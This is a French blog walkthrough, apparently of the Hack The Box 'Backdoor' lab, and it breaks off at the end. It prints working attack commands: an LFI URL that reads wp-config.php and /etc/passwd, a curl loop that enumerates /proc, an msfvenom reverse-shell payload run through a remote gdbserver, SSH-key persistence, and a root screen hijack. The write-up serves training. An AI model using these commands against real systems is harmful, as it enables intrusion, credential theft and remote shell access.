<!doctype html><html lang=fr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>HTB - Backdoor sans MetaSploit - Masoopy</title><meta name=description content><meta property="og:title" content="HTB - Backdoor sans MetaSploit"><meta property="og:description" content="Intro Pour ce premier article en Français, nous allons nous attaquer à Backdoor. Nous avons affaire à un Wordpress à jour mais avec un plugin vulnérable qui par le biais d&rsquo;une LFI et d&rsquo;un serveur distant gdb nous permettra d&rsquo;obtenir les droits &ldquo;root&rdquo;. Allons-y !
Cible HTB - Backdoor
Reconnaissance Petite reconnaissance basique en fonction des logos et autres infos :
 Il s&rsquo;agit d&rsquo;un système Linux ; &mldr;  Et c&rsquo;est tout !"><meta property="og:type" content="article"><meta property="og:url" content="https://www.masoopy.com/fr/htb-backdoor-sans-metasploit/"><meta property="article:published_time" content="2022-05-03T00:00:00+00:00"><meta property="article:modified_time" content="2022-05-03T00:00:00+00:00"><meta property="og:site_name" content="Masoopy"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Backdoor sans MetaSploit"><meta name=twitter:description content="Intro Pour ce premier article en Français, nous allons nous attaquer à Backdoor. Nous avons affaire à un Wordpress à jour mais avec un plugin vulnérable qui par le biais d&rsquo;une LFI et d&rsquo;un serveur distant gdb nous permettra d&rsquo;obtenir les droits &ldquo;root&rdquo;. Allons-y !
Cible HTB - Backdoor
Reconnaissance Petite reconnaissance basique en fonction des logos et autres infos :
 Il s&rsquo;agit d&rsquo;un système Linux ; &mldr;  Et c&rsquo;est tout !"><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/fr/htb-backdoor-sans-metasploit/><link rel=prev href=https://www.masoopy.com/fr/htb-paper-sans-metasploit/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB - Backdoor sans MetaSploit","inLanguage":"fr","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/fr\/htb-backdoor-sans-metasploit\/"},"genre":"posts","keywords":"HTB","wordcount":1772,"url":"https:\/\/www.masoopy.com\/fr\/htb-backdoor-sans-metasploit\/","datePublished":"2022-05-03T00:00:00+00:00","dateModified":"2022-05-03T00:00:00+00:00","publisher":{"@type":"Organization","name":"Denis G."},"author":{"@type":"Person","name":"Denis G."},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(''==='true'&&window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/fr/ title=Masoopy>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/fr/posts/>Articles </a><a class=menu-item href=/fr/tags/>Balises </a><a class=menu-item href=/fr/categories/>Catégories </a><a class=menu-item href=https://cheatsheets.masoopy.com/ rel="noopener noreferrer" target=_blank>Cheatsheets </a><a class=menu-item href=/fr/a-propos/>A propos </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item language" title="Choisir la langue">Français<i class="fas fa-chevron-right fa-fw"></i>
<select class=language-select id=language-select-desktop onchange="location=this.value;"><option value=/fr/htb-backdoor-sans-metasploit/ selected>Français</option></select>
</a><span class="menu-item search" id=search-desktop><input type=text placeholder="Rechercher des titres, des contenus..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Chercher><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clair><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title="Changer de Thème"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/fr/ title=Masoopy>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Rechercher des titres, des contenus..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Chercher><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clair><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Annuler</a></div><a class=menu-item href=/fr/posts/>Articles</a><a class=menu-item href=/fr/tags/>Balises</a><a class=menu-item href=/fr/categories/>Catégories</a><a class=menu-item href=https://cheatsheets.masoopy.com/ rel="noopener noreferrer" target=_blank>Cheatsheets</a><a class=menu-item href=/fr/a-propos/>A propos</a><a href=javascript:void(0); class="menu-item theme-switch" title="Changer de Thème">
<i class="fas fa-adjust fa-fw"></i></a><a href=javascript:void(0); class=menu-item title="Choisir la langue">Français<i class="fas fa-chevron-right fa-fw"></i>
<select class=language-select onchange="location=this.value;"><option value=/fr/htb-backdoor-sans-metasploit/ selected>Français</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contenu</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">HTB - Backdoor sans MetaSploit</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/fr/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Denis G.</a></span>&nbsp;<span class=post-category>inclus dans <a href=/fr/categories/hacking/><i class="far fa-folder fa-fw"></i>hacking</a>&nbsp;<a href=/fr/categories/guides/><i class="far fa-folder fa-fw"></i>Guides</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-05-03>2022-05-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1772 mots&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;9 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Backdoor_Logo.png data-srcset="/images/2022/03/Backdoor_Logo.png, /images/2022/03/Backdoor_Logo.png 1.5x, /images/2022/03/Backdoor_Logo.png 2x" data-sizes=auto alt=/images/2022/03/Backdoor_Logo.png title=/images/2022/03/Backdoor_Logo.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contenu</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#cible>Cible</a></li><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#énumération>Énumération</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#obtenir-un-premier-shell>Obtenir un premier shell</a></li><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#outro>Outro</a></li></ul></nav></div></div><div class=content id=content><h2 id=intro>Intro</h2><p>Pour ce premier article en Français, nous allons nous attaquer à Backdoor. Nous avons affaire à un Wordpress à jour mais avec un plugin vulnérable qui par le biais d&rsquo;une <code>LFI</code> et d&rsquo;un serveur distant <code>gdb</code> nous permettra d&rsquo;obtenir les droits &ldquo;root&rdquo;. Allons-y !</p><h2 id=cible>Cible</h2><p><a href=https://app.hackthebox.com/machines/Backdoor target=_blank rel="noopener noreferrer">HTB - Backdoor</a></p><h2 id=reconnaissance>Reconnaissance</h2><p>Petite reconnaissance basique en fonction des logos et autres infos :</p><ul><li>Il s&rsquo;agit d&rsquo;un système Linux ;</li><li>&mldr;</li></ul><p>Et c&rsquo;est tout !</p><h2 id=énumération>Énumération</h2><p>Lançons notre scan <code>nmap</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>sudo nmap -sC -sV -oA scans\Backdoor.htb
</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-15 14:45 CET                                                                                                                                                   
Nmap scan report for Backdoor.htb.214                                                                                                                                                                               
Host is up (0.043s latency).                                                                                                                                                                                      
Not shown: 998 closed tcp ports (reset)                                                                                                                                                                           
PORT   STATE SERVICE VERSION                                                                                                                                                                                      
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                 
| ssh-hostkey:                                                                                                                                                                                                    
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)                                                                                                                                                    
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)                                                                                                                                                   
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)                                                                                                                                                 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                                               
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                                      
|_http-generator: WordPress 5.8.1                                                                                                                                                                                 
|_http-title: Backdoor &amp;#8211; Real-Life                                                                                                                                                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                           
                                                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds 
</code></pre></td></tr></table></div></div><p>Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur web sur le port 80 qui fait tourner Wordpress.</p><p>Sachant qu&rsquo;il s&rsquo;agit d&rsquo;un serveur web, j&rsquo;aime bien lancer <code>Gobuster</code> pour essayer de trouver des chemins cachés :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://Backdoor.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://Backdoor.htb.214
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/15 14:46:36 Starting gobuster in directory enumeration mode
===============================================================
/wp-admin             (Status: 301) [Size: 319] [--&gt; http://Backdoor.htb/wp-admin/]
/wp-includes          (Status: 301) [Size: 322] [--&gt; http://Backdoor.htb/wp-includes/]
/wp-content           (Status: 301) [Size: 321] [--&gt; http://Backdoor.htb/wp-content/] 
/server-status        (Status: 403) [Size: 279]                                         
Progress: 23947 / 62284 (38.45%)                                                       [ERROR] 2022/03/15 14:47:05 [!] parse &#34;http://Backdoor.htb/error\x1f_log&#34;: net/url: invalid control character in URL
                                                                                        
===============================================================
2022/03/15 14:47:48 Finished
===============================================================
</code></pre></td></tr></table></div></div><p>Ce scan ne nous révèle pas grand chose&mldr; Mais puisqu&rsquo;il s&rsquo;agit d&rsquo;un Wordpress, nous allons lancer <code>wpscan</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>wpscan --url http://Backdoor.htb
</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>______________________________________________________________           
        __          _______   _____          
        \ \        / /  __ \ / ____|                                                                    
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|               
                                                   
        WordPress Security Scanner by the WPScan Team                       
                        Version 3.8.17                                                                  
      Sponsored by Automattic - https://automattic.com/                                    
      @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
                                                                                                                                                                                                                 
[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.                                                                                    
                                                   
[+] URL: http://Backdoor.htb.214/ [Backdoor.htb.214]
[+] Started: Tue Mar 15 14:46:02 2022 
                                                                                                                                                                                                                 
Interesting Finding(s):
                                                   
[+] Headers
| Interesting Entry: Server: Apache/2.4.41 (Ubuntu) 
| Found By: Headers (Passive Detection)
| Confidence: 100%                                                                                      
                                                                                                                                                                                                                 
[+] XML-RPC seems to be enabled: http://Backdoor.htb.214/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:                                                                                           
|  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
                                                   
[+] WordPress readme found: http://Backdoor.htb.214/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%       

[+] Upload directory has listing enabled: http://Backdoor.htb.214/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://Backdoor.htb.214/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
| Found By: Rss Generator (Passive Detection)
|  - http://Backdoor.htb.214/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;
|  - http://Backdoor.htb.214/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;

[+] WordPress theme in use: twentyseventeen
| Location: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/
| Last Updated: 2022-01-25T00:00:00.000Z
| Readme: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/readme.txt
| [!] The version is out of date, the latest version is 2.9
| Style URL: http://Backdoor.htb.214/wp-content/themes/twentyseventeen/style.css?ver=20201208
| Style Name: Twenty Seventeen
| Style URI: https://wordpress.org/themes/twentyseventeen/
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
| Author: the WordPress team
| Author URI: https://wordpress.org/
|
| Found By: Css Style In Homepage (Passive Detection)
|
| Version: 2.8 (80% confidence)
| Found By: Style (Passive Detection)
|  - http://Backdoor.htb.214/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: &#39;Version: 2.8&#39;

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:00 &lt;===================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar 15 14:46:06 2022
[+] Requests Done: 181
[+] Cached Requests: 5
[+] Data Sent: 45.04 KB
[+] Data Received: 18.321 MB
[+] Memory used: 234.484 MB
[+] Elapsed time: 00:00:04
</code></pre></td></tr></table></div></div><p>Pas grand chose à se mettre sous la dent&mldr; mais pendant que mes scans tournent en arrière plan, j&rsquo;aime bien surfer manuellement sur le site &ldquo;cible&rdquo;. Dans notre cas, j&rsquo;ai vu que le &ldquo;directory listing&rdquo; était activé, et j&rsquo;ai donc découvert un plugin intéressant.</p><p>Pour info, nous aurions aussi pu lancer un <code>wpscan</code> agrressif pour découvrir ce même plugin :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>wpscan --url http://backdoor.htb --plugins-detection aggressive
</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>[+] Enumerating All Plugins (via Aggressive Methods)                                                                                                                                                       [0/822]
 Checking Known Locations - Time: 00:07:56 &lt;==============================================================================================================================&gt; (97256 / 97256) 100.00% Time: 00:07:56
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
</code></pre></td></tr></table></div></div><p>Nous voyons donc ce plugin: <code>ebook-download</code> qui est <a href=https://www.exploit-db.com/exploits/39575 target=_blank rel="noopener noreferrer">vulnérable</a>. Nous pouvons par exemple récupérer le fichier <code>wp-config.php</code> via cette URL : <code>http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</code>.</p><p>Malheureusement, cela ne nous aide pas&mldr; le mot de passe utilisé par le compte <code>MySQL</code> n&rsquo;est pas le même que celui de <code>root</code>, ni même de l&rsquo;utilisateur qui s&rsquo;appelle d&rsquo;ailleurs <code>user</code> (d&rsquo;après le fichier <code>/etc/passwd</code> que nous pouvons aussi récupérer via cette LFI).</p><h2 id=exploitation>Exploitation</h2><p>Cependant, Linux maintient une liste de processus dans <code>/proc</code> et cela est accessible par n&rsquo;importe qui. Après avoir vérifié que cela fonctionne avec <code>Burp</code>, nous pouvons écrire un petit bout de script pour automatiser la chose :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>for i in $(seq 0 2000); do echo -n &#34;$i: &#34;; curl &#34;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=//proc/$i/cmdline&#34; --output -; echo; done | tee pid.lst
</code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Backdoor_GDB.png data-srcset="/images/2022/03/Backdoor_GDB.png, /images/2022/03/Backdoor_GDB.png 1.5x, /images/2022/03/Backdoor_GDB.png 2x" data-sizes=auto alt=/images/2022/03/Backdoor_GDB.png title="Backdoor PS List"></p><p>NB : a noter que le &ldquo;//&rdquo;, est une sorte d&rsquo;abréviation pour remplacer les moultes &ldquo;../../&rdquo; qui permettent de remonter du <code>webdir</code> jusqu&rsquo;à la racine du système.</p><p>Ce script est très sommaire et mériterait quelques coups de <code>sed</code> / <code>awk</code> pour nettoyer l'<code>output</code>, cependant, il nous révèle la présence d&rsquo;un serveur <code>gdb</code> sur le port 1337 que nous avions raté lors de notre scan <code>nmap</code> initial.</p><h3 id=obtenir-un-premier-shell>Obtenir un premier shell</h3><p>Après quelques secondes de lectures sur <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver target=_blank rel="noopener noreferrer">la bible du PenTest</a>, nous trouvons une méthode pour exploiter un serveur distant <code>gdb</code> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback># Trick shared by @B1n4rySh4d0w
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf

chmod +x binary.elf

gdb binary.elf

# Set remote debuger target
target extended-remote 10.10.10.11:1337

# Upload elf file
remote put binary.elf binary.elf

# Set remote executable file
set remote exec-file /home/user/binary.elf

# Execute reverse shell executable
run

# You should get your reverse-shell
</code></pre></td></tr></table></div></div><p>En effet, nous obtenons bien un shell ! Obtenir le <code>flag user</code> est donc un jeu d&rsquo;enfant, via la commande <code>cat</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Backdoor_User_Flag.png data-srcset="/images/2022/03/Backdoor_User_Flag.png, /images/2022/03/Backdoor_User_Flag.png 1.5x, /images/2022/03/Backdoor_User_Flag.png 2x" data-sizes=auto alt=/images/2022/03/Backdoor_User_Flag.png title="Backdoor User Flag"></p><h3 id=privesc>PrivEsc</h3><p>Avant de travailler sur le PrivEsc, j&rsquo;aime bien sécuriser mon accès en y déposant ma clef ssh. Pour rappel, on la génère avec :</p><p><code>ssh-keygen -f backdoor</code></p><p>NB : pas de &ldquo;mot de passe&rdquo;, je génère une nouvelle clef pour chaque box, que je nomme du nom de la box.</p><p>Ensuite, nous l&rsquo;inscrivons dans le fichier <code>authorized_keys</code> de l&rsquo;utilisateur que nous venons de pwn.</p><p><code>echo xxxxxxxx > ~/.ssh/authorized_keys</code></p><p>avec &ldquo;xxxxxxxx&rdquo;, étant le contenu de votre fichier backdoor.pub.</p><p>Enfin, n&rsquo;oubliez pas de changer les droits, sur le serveur distant :</p><p><code>chmod 600 ~/.ssh/authorized_keys</code></p><p>et sur votre clef juste créée :</p><p><code>chmod 600 backdoor</code></p><p>Nous pouvons nous reconnecter en SSH avec un shell digne de ce nom.</p><p>Peut-être l&rsquo;aviez-vous remarqué avant, mais nous avons aperçu qu&rsquo;une session du logiciel <code>screen</code> tournait sur le serveur. C&rsquo;est toujours intéressant, et cela mérite d&rsquo;y regarder de plus près via la liste des process :</p><p><code>ps faux</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Backdoor_PS_Screen.png data-srcset="/images/2022/03/Backdoor_PS_Screen.png, /images/2022/03/Backdoor_PS_Screen.png 1.5x, /images/2022/03/Backdoor_PS_Screen.png 2x" data-sizes=auto alt=/images/2022/03/Backdoor_PS_Screen.png title="Backdoor PS Screen"></p><p>Effectivement, <code>screen</code> tourne en tant que <code>root</code> avec les arguments <code>dmS root</code>. Après une inspection du <code>man</code>, cela veut dire que <code>screen</code> a été lancé en mode détaché avec le nom de session <code>root</code>.</p><p>Pour récupérer la session, il suffit de taper :</p><p><code>screen -dr root/992.root</code></p><p>Et bingo, nous sommes <code>root</code> et pouvons récupérer le <code>flag root</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2022/03/Backdoor_Root_Flag.png data-srcset="/images/2022/03/Backdoor_Root_Flag.png, /images/2022/03/Backdoor_Root_Flag.png 1.5x, /images/2022/03/Backdoor_Root_Flag.png 2x" data-sizes=auto alt=/images/2022/03/Backdoor_Root_Flag.png title="Backdoor Root Flag"></p><h2 id=outro>Outro</h2><p>Une nouvelle box plutôt fun, qui m&rsquo;a permis de jouer avec le contenu de <code>/proc</code> afin de retrouver les processus actifs du serveur. Mais aussi une box, qui m&rsquo;a rappelé que les scans <code>nmap</code> rapides, c&rsquo;est bien joli, mais ça ne voit pas tout.</p><p>A 